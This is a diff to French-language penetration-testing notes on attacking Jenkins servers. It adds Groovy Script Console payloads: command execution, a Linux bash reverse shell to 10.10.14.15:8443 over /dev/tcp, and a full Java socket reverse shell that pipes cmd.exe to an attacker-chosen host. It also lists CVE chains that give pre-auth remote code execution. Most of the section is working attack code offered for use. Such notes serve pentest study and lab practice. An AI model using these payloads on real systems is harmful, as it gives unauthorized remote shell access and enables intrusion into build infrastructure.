@@ -609,24 +609,51 @@ Jenkins est un serveur d'intégration continue écrit en Java. Il tourne souvent
 
 # Attacking Jenkins
 
-## Script Console
-- URL console : `http://<jenkins>/script`
-- Exemple (exécute `id`) — format Groovy :
-  - `def cmd = 'id'`
-  - `def sout = new StringBuffer(), serr = new StringBuffer()`
-  - `def proc = cmd.execute()`
-  - `proc.consumeProcessOutput(sout, serr)`
-  - `proc.waitForOrKill(1000)`
-  - `println sout`
+## Script Console (exécution de commandes)
+- Exécuter `id` (Groovy) :
+```python
+def cmd = 'id'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+```
+## Reverse shell Linux (Groovy)
+- Exemple qui ouvre une connexion reverse vers `10.10.14.15:8443` :
+```java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+## Commandes Windows simples (Groovy)
+- Lister un répertoire :
+    def cmd = "cmd.exe /c dir".execute();
+    println("${cmd.text}");
 
-- Exemple reverse shell (Linux) — Groovy :
-  - `r = Runtime.getRuntime()`
-  - `p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])`
-  - `p.waitFor()`
+## Reverse shell Windows / Java (Groovy snippet)
+- Reverse shell Java/Groovy (remplacer `localhost` et `8044` par votre IP/port) :
+```java
+    String host="localhost";
+    int port=8044;
+    String cmd="cmd.exe";
 
-- Exemple simple Windows (commande) :
-  - `def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");`
+    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+    Socket s=new Socket(host,port);
 
+    InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
+    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+
+    while(!s.isClosed()){
+        while(pi.available()>0) so.write(pi.read());
+        while(pe.available()>0) so.write(pe.read());
+        while(si.available()>0) po.write(si.read());
+        so.flush(); po.flush();
+        Thread.sleep(50);
+        try { p.exitValue(); break; } catch (Exception e) {}
+    };
+    p.destroy(); s.close();
+```
 ## Vulnérabilités
 - Chaînage de deux vulnérabilités (`CVE-2018-1999002` + `CVE-2019-1003000`) permettant RCE *pre-auth* via contournement du sandbox de compilation des scripts.
 - Contournement de l’ACL `Overall/Read` via un mécanisme de routing dynamique (permet d’exécuter un Groovy qui télécharge/charge un JAR malveillant).
